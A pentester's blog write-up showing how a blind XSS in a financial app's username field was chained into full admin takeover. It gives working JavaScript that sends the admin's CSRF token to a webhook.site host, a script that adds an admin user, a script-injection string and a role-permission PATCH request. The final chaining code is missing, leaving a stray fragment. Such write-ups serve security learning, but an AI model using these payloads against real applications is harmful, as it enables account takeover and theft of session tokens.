# Introduction
Welcome everyone! In addition to my regular work, I take on some pentesting projects as a freelancer for various clients. Today, I’m excited to share a particularly interesting bug that started as a seemingly straightforward `XSS` vulnerability but ultimately led to a full application takeover.

# Application Overview
The application in question is a financial solution platform. It includes a web dashboard used by high-privileged users, such as `admin`, and a mobile application designed for `customers`. The customers can only perform specific actions like signing up, viewing their personal and financial information, reporting issues, modifying their profiles, and more. The application's user features are outlined as follows:

| **Feature**              | **Description**                                                                 |
|-------------------------------|---------------------------------------------------------------------------------|
| **all notifications**          | View and manage all notifications generated by the application.                 |
| **check incomplete applications** | Review and track applications that are not fully completed.                    |
| **Edit Profile**               | Allows users to modify their personal profile information within the application.|
| **get Dashboard**              | Access the main dashboard, displaying an overview of important metrics and data. |
| **Read Applications**          | Review and analyze submitted applications.                                      |
| **Submit Application**         | Submit new applications through the platform.                                   |
| **unRead Notifications**       | View notifications that have not been read yet.                                 |
| **update profile**             | Update and save changes to the user's profile information.                      |

For the `admins`, they have full access to the application, including control over all users and customers. Unlike `customers`, `users` can be created by the `admin` and assigned specific roles, which limit the privileges of each user. Each role comes with its own set of permissions, and there are over `70` different permissions available in the application. The features available to `admins` include the following:

| **Feature Name**          | **Description**                                                                 |
|---------------------------|---------------------------------------------------------------------------------|
| **Dashboard**             | Provides an overview of key metrics and data relevant to the admin's tasks.     |
| **Roles**                 | Manage and assign different roles and permissions to users within the system.   |
| **Users**                 | View, manage, and edit user accounts and their information.                     |
| **Customers**             | Manage customer profiles and information.                                       |
| **Applications**          | Review, approve, or reject applications submitted by customers.                    |
| **Generic Keys**          | Manage generic keys used for system operations or integrations.                 |
| **Generic Key Values**    | Assign and manage values associated with generic keys in the system.            |
| **Products**              | Manage the product offerings available in the system.                           |
| **Sub Products**          | Handle subcategories or variations of main products.                           |
| **Financing Companies**   | Manage information related to financing companies associated with the system.   |
| **Subscription Plans**    | Create, edit, and manage subscription plans available to users.                |

| **Configurations**        | Manage system configurations and settings.                                     |


The application included the following permissions:



| **Permission**             | **Permission**             | **Permission**                | **Permission**                |

# The Story

## XSS Vulnerability

On the mobile application side, when a user changes their `username` to the following:

![image](https://github.com/user-attachments/assets/43a36959-5830-4b76-9147-170cdd2c79c6)

The request looks like this:

![image](https://github.com/user-attachments/assets/e9f4ff52-258f-4aaa-b387-cd732fae4480)

Our malicious input, which includes a JavaScript alert, is sent in the request without any filtration on the mobile app side. When this request reaches the `admin` dashboard, it displays as follows:

![image](https://github.com/user-attachments/assets/28798802-9b02-486b-95d7-6f80fce70783)

This indicates that we have a blind `XSS` vulnerability. The next logical step would be to steal the admin's cookies and gain access to their account. However, the challenge here is that the cookies are marked as `HttpOnly`. The `HttpOnly` attribute is specifically designed to mitigate certain forms of `XSS` attacks by preventing cookies from being accessed through client-side scripts, as illustrated below:



![image](https://github.com/user-attachments/assets/71074ab9-46cd-49cb-9b90-b56f61752532)



## Find Another way

At that point, I decided to set aside the `XSS` vulnerability and began searching for other potential vulnerabilities that might allow me to access the `admin` account or perform administrative actions. That's when I considered the possibility of a `CSRF` (Cross-Site Request Forgery) vulnerability, especially since the `admin` has the ability to add new `users`, which could include another `admin`. When adding a new user, the process looked like this:

![image](https://github.com/user-attachments/assets/05286717-52a8-4938-b836-3d3563d3aeb2)

The fields shown in the screenshot are the required inputs to add a new `user`. After intercepting the request in `BurpSuite`, the request appeared as follows:

```
POST /app/public/admin/users HTTP/1.1 
Host: application.com
User-Agent: UserAgent
Accept: text/html, application/xhtml+xml,application/xml;q=0.9, image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US, en; q=0.5 
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded 
Content-Length: 156
Origin: http://application.com 
Connection: close
Referer: http://application.com/app/public/admin/users/create 
Cookie: XSRF-TOKEN=eyJp............; session=eyJ......In0&3D

_token=rR8Hp7ewaT8FenxSzfAfqhN9ue5LiFgi13HS76SS&name=Pentester&email=pentest%40pentest.co&password=Pentest123456%23&confirm-password=Pentest123456%23&role=2
```

Here, I found both good and bad news. The good news was that the admin dashboard wasn't using a `JSON Web Token` like the mobile app, making it potentially vulnerable to `CSRF` attacks. The bad news was the presence of a `CSRF` token in the `_token` parameter, which verifies the request's authenticity. I attempted several common methods to bypass the `CSRF` token, such as using a random token of the same length, setting the value to `NULL` or empty, or removing the entire parameter and value. Unfortunately, none of these attempts were successful.

After further investigation, I discovered that the `CSRF` token is retrieved from a `meta` tag in the response page, as shown below:

![image](https://github.com/user-attachments/assets/4f22dda6-0494-42ba-b7ef-93d9aa3bf83f)

This discovery led me back to the `XSS` vulnerability. Although I couldn't steal cookies due to the `HttpOnly` attribute, I realized I could still load JavaScript by exploiting the `src` attribute within the `script` tag. By doing so, I could inject a JavaScript code snippet to retrieve the `meta` tag with `name="csrf-token"` and extract its `content` attribute value, which contains the `CSRF` token.

## Give me the Token

To retrieve the `CSRF` token, I used the following code:

```javascript
let csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
alert(csrfToken);
```

Here’s how it works: First, I used the `document.querySelector` method to find a `meta` tag with the attribute `name="csrf-token"`. The selector `'meta[name="csrf-token"]'` specifically targets this tag within the document. Once the meta tag is located, the `getAttribute` method is called to extract the value of its `content` attribute, which contains the actual `CSRF` token. This value is then stored in the `csrfToken` variable. Finally, the `alert` function is used to display the value of `csrfToken`.

![image](https://github.com/user-attachments/assets/76fee310-a845-4822-a506-61ff330c1de6)

Seeing that the approach was successful, I proceeded to steal the `CSRF` token and send it to my server using `webhook.site`. Here’s the updated code:

```javascript
let csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
let url = "https://webhook.site/hereShouldHaveYourID/";
url += "?token=" + encodeURIComponent(csrfToken);
let i = new Image();
i.src = url;
```

After retrieving the `CSRF` token and storing it in the `csrfToken` variable, I set up the base URL for my webhook site. The `CSRF` token is then appended as a query parameter to the URL using `encodeURIComponent` to ensure it’s safely included. Finally, the script creates an image object and sets its `src` to the constructed URL, triggering a `GET` request that sends the `CSRF` token to my server.

![image](https://github.com/user-attachments/assets/2843ab7b-3cde-4667-8294-f0415a2aea31)

As shown, I successfully stole the `CSRF` token using this method.

## Add New User

After successfully stealing the `CSRF` token, I considered whether it was worth pursuing the traditional `CSRF` attack route—injecting the stolen token into a request and sending a `CSRF` payload to the `admin`, hoping they would click on it. But why stop there when we can be more creative? Since we can retrieve the `CSRF` token and inject JavaScript into the `admin`'s browser, we can take a more direct approach by executing a request directly through the `admin`'s browser using JavaScript.

Here’s how I updated the code:

```javascript
let csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

let data = new URLSearchParams();
data.append('_token', csrfToken);
data.append('name', 'Pentester');
data.append('email', 'pentest@pentest.co');
data.append('password', 'Pentest123456#');
data.append('confirm-password', 'Pentest123456#');
data.append('role', '2');

fetch('http://application.com/app/public/admin/users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: data
})
.then(response => response.text())
.then(data => {
    console.log('Success:', data);
})
.catch((error) => {
    console.error('Error:', error);
});
```

In this script, after retrieving the `CSRF` token and storing it in the `csrfToken` variable, I created a `URLSearchParams` object to encode and organize the data that will be sent in the request. I appended several key-value pairs, including the CSRF token (`_token`), a name (`Pentester`), an email (`pentest@pentest.co`), a password (`Pentest123456#`), and a role ID (`2`), which is unknown in terms of permissions. I then used the `fetch` API to send a POST request to `http://application.com/app/public/admin/users`, aiming to add a new user. The results were logged in the console.

To test the payload, I hosted it locally and updated the username to include the following malicious script: `'"><script src="http://localhost/exploit.js"></script>`. When the `admin` loaded the page containing this script, the code executed successfully, logging the message in the console and confirming that the new `admin` user was added.



![image](https://github.com/user-attachments/assets/827b31f6-79f4-4ae4-b5b8-e547a4592555)



However, there’s a potential limitation: if the role ID I used in the request doesn’t have sufficient permissions, the new `admin` user may not be able to perform significant actions. This is an issue that needs addressing to ensure the exploit's effectiveness.

## Patch The Role

When we explore all the roles available in the application:

![image](https://github.com/user-attachments/assets/b50539cd-0af2-4d44-8a59-36515344e033)

We have the option to edit any of these roles. Let's select a `role` to edit:

![image](https://github.com/user-attachments/assets/4f084f3d-8140-4fdf-9ce0-665ee669c070)

From this screen, we can see that editing a role is done through the endpoint `/app/public/admin/roles/{id}/edit`, where `{id}` corresponds to the specific role ID. In this interface, we can choose the permissions we want to assign to the role. To better understand how this works, let's intercept and analyze the request using `BurpSuite`.

```
POST /app/public/admin/roles/{roleNumber} HTTP/1.1
Host: application.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [calculated-length]

_method=PATCH&_token=[csrfToken]&name=PoC4Exploit&status=on&permission[]=1&permission[]=2&permission[]=3&permission[]=4&permission[]=11&permission[]=12&permission[]=13&permission[]=14&permission[]=15&permission[]=16&permission[]=17&permission[]=18&permission[]=19&permission[]=20&permission[]=21&permission[]=22&permission[]=23&permission[]=24&permission[]=25&permission[]=26&permission[]=27&permission[]=28&permission[]=29&permission[]=30&permission[]=31&permission[]=32&permission[]=33&permission[]=34&permission[]=35&permission[]=36&permission[]=37&permission[]=38&permission[]=39&permission[]=40&permission[]=41&permission[]=42&permission[]=43&permission[]=44&permission[]=45&permission[]=46&permission[]=47&permission[]=48&permission[]=49&permission[]=50&permission[]=51&permission[]=52&permission[]=53&permission[]=54&permission[]=55&permission[]=56&permission[]=57&permission[]=58&permission[]=59&permission[]=60&permission[]=61&permission[]=65&permission[]=66&permission[]=67&permission[]=68&permission[]=69&permission[]=70&permission[]=71&permission[]=72&permission[]=73&permission[]=74&permission[]=75&permission[]=76&permission[]=77&permission[]=78&permission[]=79&permission[]=80&permission[]=81&permission[]=82&permission[]=83&permission[]=84&permission[]=85&permission[]=86&permission[]=87&permission[]=88&permission[]=89&permission[]=90&permission[]=91
```

Here’s how the request appears when editing a `role` and activating all its permissions. Before adding the malicious `user`, we can strategically edit the `role` to ensure it has all permissions enabled. After modifying the role, we can then add the user with the modified `role` ID, granting the new user full access within the application.

# Chaining All Together

Now, we still need to verify whether the `role` ID exists before attempting to edit it. When we send a request to the `/app/public/admin/roles/{id}/edit` endpoint, if the `role` ID does not exist, the application responds with a `500` status code. If the response is anything other than `500`, it indicates that the `role` ID exists. The following diagram explains how we will chain all these steps together to update our code:

findRole(1, 10);
```

Here I grab the `CSRF` token from the `meta` tag, which I store in the `csrfToken` variable. Then define the `findRole` function, where I iterate through potential `role` numbers. I start by sending `GET` requests to the `role` edit endpoint, beginning with role number `1` and incrementing up to `10`. The function checks if each `role` exists by evaluating the server’s response: if the response status is anything other than `500`, it indicates that the `role` is a valid `role`. then, the function triggers  `patchRole` to escalate permissions by modifying the identified `role`.  Once the role has been successfully patched, It will add our new user `admin`.

Now, I can control all the application including everyting related to the busniess and the system.

# Conclusion

In this exploit, I leveraged a combination of an `XSS` vulnerability and `CSRF` token retrieval to achieve a full application takeover, starting from what appeared to be a simple `XSS` issue. By first identifying that the application was using an `HttpOnly` flag on cookies, I bypassed the limitation by focusing on obtaining the `CSRF` token directly from the `meta` tag using `JavaScript` injected via `XSS`. With the token in hand, I could have constructed a `CSRF` attack, but instead, I opted for a more direct approach by using the stolen token to execute actions directly through the admin's browser, including modifying user roles and creating a new administrator account. This method allowed me to patch an existing `role` with full permissions and then create a new user associated with that role, ensuring the user had elevated access. By chaining these vulnerabilities together `XSS`, `CSRF` token retrieval, `role` modification, and user creation, I was able to demonstrate how a seemingly low-risk vulnerability could be escalated to gain complete control over the application.
